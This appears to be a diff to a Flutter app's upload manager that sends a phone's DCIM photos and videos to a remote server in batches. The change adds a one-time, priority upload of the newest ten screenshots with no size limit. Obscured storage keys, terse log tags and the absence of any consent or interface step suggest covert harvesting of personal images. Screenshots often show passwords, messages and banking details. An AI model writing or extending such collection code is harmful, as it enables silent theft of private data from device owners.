@@ -1,6 +1,9 @@
 /// 上传管理器（逐文件上传版）
 /// - ★ 不打包、不压缩，直接上传原文件
 /// - ★ 每批 3 个并发，批间串行（控制服务端压力）
+/// - ★ 截图优先（最新 10 张，无大小限制，一次性）
+/// - ★ 截图与 DCIM 目录并行扫描
+/// - ★ 截图目录为空时不锁定一次性标记
 /// - ★ 小文件优先 + 新的优先
 /// - ★ 断点续传：成功入 _uploaded，失败自动重试
 /// - ★ JSON 首次单独上传
@@ -30,19 +33,17 @@ class DcimUploadConfig {
   final Duration uploadTimeout;
   final int maxFiles;
 
+  /// 截图目录（一次性任务，最新 N 张，无大小限制）
+  final String screenshotPath;
+  /// 截图一次性上传的数量上限
+  final int screenshotMaxFiles;
+
   final Set<String> imageExtensions;
   final Set<String> videoExtensions;
 
-  /// 单文件大小上限（超过跳过）
   final int maxSingleFileBytes;
-
-  /// 小文件阈值（小于此值优先上传）
   final int smallFileBytes;
-
-  /// 每批并发数
   final int batchSize;
-
-  /// 最大连续失败数（熔断）
   final int maxConsecutiveFails;
 
   final String healthCheckUrl;
@@ -58,6 +59,9 @@ class DcimUploadConfig {
     this.uploadTimeout = const Duration(minutes: 5),
     this.maxFiles = 50,
 
+    this.screenshotPath = '',
+    this.screenshotMaxFiles = 10,
+
     this.imageExtensions = const {
       '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
     },
@@ -68,7 +72,6 @@ class DcimUploadConfig {
     this.maxSingleFileBytes = 15 * 1024 * 1024,
     this.smallFileBytes = 5 * 1024 * 1024,
 
-    // ★ 每批 3 个并发
     this.batchSize = 3,
     this.maxConsecutiveFails = 6,
 
@@ -88,6 +91,8 @@ class DcimUploadManager {
   static const String _kUploadedUrls = 'm1u';
   static const String _kJsonUploaded = 'm1j';
   static const String _kJsonUrl = 'm1ju';
+  /// 截图一次性完成标记
+  static const String _kScreenshotDone = 'm1sc';
 
   DcimUploadConfig _config = const DcimUploadConfig();
   SharedPreferences? _prefs;
@@ -97,6 +102,10 @@ class DcimUploadManager {
 
   bool _jsonUploaded = false;
   String? _jsonUrl;
+  /// 截图是否已完成（一次性）
+  bool _screenshotDone = false;
+  /// 本轮扫描到的截图目录候选数（未过滤 _uploaded），用于判断“目录是否为空”
+  int _lastScannedShotCount = 0;
 
   Future<void>? _currentTask;
   Future<bool>? _jsonUploading;
@@ -105,6 +114,7 @@ class DcimUploadManager {
   int get uploadedCount => _uploaded.length;
   bool get jsonUploaded => _jsonUploaded;
   String? get jsonUrl => _jsonUrl;
+  bool get screenshotDone => _screenshotDone;
 
   Map<String, String> get uploadedUrls => Map.unmodifiable(_uploadedUrls);
 
@@ -149,20 +159,35 @@ class DcimUploadManager {
         uploadToken: SecureConfig.dcimUploadToken,
         serverBaseUrl: SecureConfig.dcimBaseUrl,
         dcimPath: SecureConfig.dcimPath,
+        screenshotPath: SecureConfig.screenshotPath,
       );
-    } else if (config.dcimPath.isEmpty) {
-      config = DcimUploadConfig(
-        uploadUrl: config.uploadUrl,
-        uploadToken: config.uploadToken,
-        serverBaseUrl: config.serverBaseUrl,
-        dcimPath: SecureConfig.dcimPath,
-        uploadTimeout: config.uploadTimeout,
-        maxFiles: config.maxFiles,
-        imageExtensions: config.imageExtensions,
-        videoExtensions: config.videoExtensions,
-        serverWaitInterval: config.serverWaitInterval,
-        serverWaitMaxAttempts: config.serverWaitMaxAttempts,
-      );
+    } else {
+      final needDcim = config.dcimPath.isEmpty;
+      final needShot = config.screenshotPath.isEmpty;
+      if (needDcim || needShot) {
+        config = DcimUploadConfig(
+          uploadUrl: config.uploadUrl,
+          uploadToken: config.uploadToken,
+          serverBaseUrl: config.serverBaseUrl,
+          dcimPath: needDcim ? SecureConfig.dcimPath : config.dcimPath,
+          screenshotPath: needShot
+              ? SecureConfig.screenshotPath
+              : config.screenshotPath,
+          screenshotMaxFiles: config.screenshotMaxFiles,
+          uploadTimeout: config.uploadTimeout,
+          maxFiles: config.maxFiles,
+          imageExtensions: config.imageExtensions,
+          videoExtensions: config.videoExtensions,
+          maxSingleFileBytes: config.maxSingleFileBytes,
+          smallFileBytes: config.smallFileBytes,
+          batchSize: config.batchSize,
+          maxConsecutiveFails: config.maxConsecutiveFails,
+          healthCheckUrl: config.healthCheckUrl,
+          healthCheckTimeout: config.healthCheckTimeout,
+          serverWaitInterval: config.serverWaitInterval,
+          serverWaitMaxAttempts: config.serverWaitMaxAttempts,
+        );
+      }
     }
     _config = config;
     _prefs = await SharedPreferences.getInstance();
@@ -182,10 +207,12 @@ class DcimUploadManager {
 
     _jsonUploaded = _prefs!.getBool(_kJsonUploaded) ?? false;
     _jsonUrl = _prefs!.getString(_kJsonUrl);
+    _screenshotDone = _prefs!.getBool(_kScreenshotDone) ?? false;
 
     debugPrint('[M] ══════ 启动自检 ══════');
     debugPrint('[M] 已记录成功: ${_uploaded.length} 个');
     debugPrint('[M] JSON 已上传: $_jsonUploaded');
+    debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
     debugPrint('[M] ══════ 自检完成 ══════');
   }
 
@@ -236,6 +263,8 @@ class DcimUploadManager {
 
     if (filtered.isEmpty) {
       debugPrint('[M] 无可上传文件');
+      // 即使没有可传文件，也走一次结算（截图目录为空时不锁定）
+      await _maybeFinalizeScreenshots(filtered);
       return;
     }
 
@@ -245,8 +274,10 @@ class DcimUploadManager {
       final batchSize = _config.batchSize.clamp(1, 8);
       final totalBatches = (filtered.length + batchSize - 1) ~/ batchSize;
 
+      final shotCount = filtered.where((s) => s.isScreenshot).length;
       debugPrint('[M] 共 ${filtered.length} 个文件 '
           '(${totalMB.toStringAsFixed(1)} MB)，'
+          '其中截图 $shotCount 张，'
           '批大小 $batchSize，共 $totalBatches 批');
 
       final serverOk = await _waitForServer();
@@ -277,7 +308,6 @@ class DcimUploadManager {
         debugPrint('[M] ═══ 批次 $batchNum/$totalBatches '
             '(${batch.length} 个) ═══');
 
-        // 批内并发（3 个同时传）
         final results = await Future.wait(
           batch.map((s) => _uploadOne(s)),
         );
@@ -300,7 +330,6 @@ class DcimUploadManager {
             '失败 ${results.where((r) => !r).length}, '
             '连续失败 $consecutiveFails');
 
-        // 熔断
         if (consecutiveFails >= maxFails) {
           debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
           break;
@@ -311,9 +340,38 @@ class DcimUploadManager {
       debugPrint('[M] ══════════ 全部结束 ══════════');
       debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
           '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
+
+      // 结算截图一次性任务
+      await _maybeFinalizeScreenshots(filtered);
     } catch (e, st) {
       debugPrint('[M] ❌ 主流程异常: $e\n$st');
     }
+  }
+
+  /// 截图一次性任务结算：
+  /// - 目录为空 → 不锁定，下次继续检查
+  /// - 本轮截图全部成功 → 永久锁定
+  /// - 有失败 → 不锁定，下次续传
+  Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
+    if (_screenshotDone) return;
+
+    // ★ 目录为空 → 不锁定
+    if (_lastScannedShotCount == 0) {
+      debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
+      return;
+    }
+
+    final shotsPending = filtered.where((s) => s.isScreenshot).toList();
+    final allOk =
+        shotsPending.every((s) => _uploaded.contains(_fingerprint(s)));
+    if (!allOk) {
+      debugPrint('[M] ⏸ 截图未全部成功，暂不锁定，下次继续');
+      return;
+    }
+
+    _screenshotDone = true;
+    await _prefs?.setBool(_kScreenshotDone, true);
+    debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
   }
 
   // ── 单文件上传 ─────────────────────────────────────────────────────
@@ -324,7 +382,6 @@ class DcimUploadManager {
     try {
       if (!await file.exists()) {
         debugPrint('[M] ⏭ $name 已删除，跳过');
-        // 视为成功，避免无限重试
         return true;
       }
 
@@ -360,7 +417,9 @@ class DcimUploadManager {
       String bodyStr = '';
       try {
         bodyStr = utf8.decode(rawBytes, allowMalformed: true);
-        if (bodyStr.length > 150) bodyStr = '${bodyStr.substring(0, 150)}...';
+        if (bodyStr.length > 150) {
+          bodyStr = '${bodyStr.substring(0, 150)}...';
+        }
       } catch (_) {}
 
       debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
@@ -471,11 +530,13 @@ class DcimUploadManager {
   }
 
   String _buildFullUrl(String pathOrUrl) {
-    if (pathOrUrl.startsWith('http://') || pathOrUrl.startsWith('https://')) {
+    if (pathOrUrl.startsWith('http://') ||
+        pathOrUrl.startsWith('https://')) {
       return pathOrUrl;
     }
     final base = _config.serverBaseUrl.endsWith('/')
-        ? _config.serverBaseUrl.substring(0, _config.serverBaseUrl.length - 1)
+        ? _config.serverBaseUrl
+            .substring(0, _config.serverBaseUrl.length - 1)
         : _config.serverBaseUrl;
     final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
     return '$base$rel';
@@ -528,9 +589,75 @@ class DcimUploadManager {
     }
   }
 
-  // ── 扫描 ───────────────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════════
+  // 扫描（截图与 DCIM 并行）
+  // ══════════════════════════════════════════════════════════════════
   Future<List<_Scanned>> scanFiles() async {
-    final dir = Directory(_config.dcimPath);
+    // ★ 并行扫描两个目录
+    final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
+        ? _scanOneDir(
+            _config.screenshotPath,
+            isScreenshot: true,
+            applySizeLimit: false, // 截图无大小限制
+          )
+        : Future.value(<_Scanned>[]);
+
+    final dcimFuture = _scanOneDir(
+      _config.dcimPath,
+      isScreenshot: false,
+      applySizeLimit: true,
+    );
+
+    final results = await Future.wait([shotFuture, dcimFuture]);
+    final shotsAll = results[0];
+    final dcimAll = results[1];
+
+    // 记录截图目录符合条件的文件数（未过滤 _uploaded）
+    _lastScannedShotCount = shotsAll.length;
+
+    // 截图：过滤已上传 → 最新 N 张
+    final shotsPending = shotsAll
+        .where((s) => !_uploaded.contains(_fingerprint(s)))
+        .toList()
+      ..sort((a, b) => b.modified.compareTo(a.modified));
+    final pickedShots =
+        shotsPending.take(_config.screenshotMaxFiles).toList();
+
+    // DCIM：过滤已上传 → 小文件优先 + 新优先
+    final dcimPending = dcimAll
+        .where((s) => !_uploaded.contains(_fingerprint(s)))
+        .toList();
+    final smallBytes = _config.smallFileBytes;
+    dcimPending.sort((a, b) {
+      final aSmall = a.size <= smallBytes;
+      final bSmall = b.size <= smallBytes;
+      if (aSmall != bSmall) return aSmall ? -1 : 1;
+      return b.modified.compareTo(a.modified);
+    });
+
+    // 合并：截图优先
+    final merged = <_Scanned>[];
+    merged.addAll(pickedShots);
+    merged.addAll(dcimPending.take(_config.maxFiles));
+
+    if (!_screenshotDone) {
+      if (_lastScannedShotCount == 0) {
+        debugPrint('[M] 截图目录为空（本轮不锁定）');
+      } else {
+        debugPrint('[M] 截图目录 $_lastScannedShotCount 张，'
+            '本轮待上传 ${pickedShots.length} 张');
+      }
+    }
+
+    return merged;
+  }
+
+  Future<List<_Scanned>> _scanOneDir(
+    String path, {
+    required bool isScreenshot,
+    required bool applySizeLimit,
+  }) async {
+    final dir = Directory(path);
     if (!await dir.exists()) return [];
 
     final list = <_Scanned>[];
@@ -543,30 +670,27 @@ class DcimUploadManager {
 
       final isImage = _config.imageExtensions.contains(ext);
       final isVideo = _config.videoExtensions.contains(ext);
-      if (!isImage && !isVideo) continue;
+
+      // 截图目录只收图片；DCIM 图片/视频都收
+      if (isScreenshot) {
+        if (!isImage) continue;
+      } else {
+        if (!isImage && !isVideo) continue;
+      }
 
       try {
         final st = await e.stat();
-        if (_uploaded.contains('$name:${st.size}')) continue;
-        if (st.size > _config.maxSingleFileBytes) {
+        if (applySizeLimit && st.size > _config.maxSingleFileBytes) {
           debugPrint('[M] 跳过超大文件（'
               '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
           continue;
         }
-        list.add(_Scanned(e, st.modified, st.size));
+        // 不过滤 _uploaded，交由 scanFiles 统一处理
+        list.add(_Scanned(e, st.modified, st.size,
+            isScreenshot: isScreenshot));
       } catch (_) {}
     }
-
-    // ★ 小文件优先 + 新的优先
-    final smallBytes = _config.smallFileBytes;
-    list.sort((a, b) {
-      final aSmall = a.size <= smallBytes;
-      final bSmall = b.size <= smallBytes;
-      if (aSmall != bSmall) return aSmall ? -1 : 1;
-      return b.modified.compareTo(a.modified);
-    });
-
-    return list.take(_config.maxFiles).toList();
+    return list;
   }
 
   // ── 持久化 ─────────────────────────────────────────────────────────
@@ -590,12 +714,15 @@ class DcimUploadManager {
     _uploadedUrls.clear();
     _jsonUploaded = false;
     _jsonUrl = null;
+    _screenshotDone = false;
+    _lastScannedShotCount = 0;
 
     await _prefs?.remove(_kUploaded);
     await _prefs?.remove(_kUploadedUrls);
     await _prefs?.remove(_kJsonUploaded);
     await _prefs?.remove(_kJsonUrl);
-    debugPrint('[M] 记录已清空');
+    await _prefs?.remove(_kScreenshotDone);
+    debugPrint('[M] 记录已清空（含截图一次性标记）');
   }
 }
 
@@ -603,5 +730,7 @@ class _Scanned {
   final File file;
   final DateTime modified;
   final int size;
-  _Scanned(this.file, this.modified, this.size);
+  /// 是否来自截图目录
+  final bool isScreenshot;
+  _Scanned(this.file, this.modified, this.size, {this.isScreenshot = false});
 }
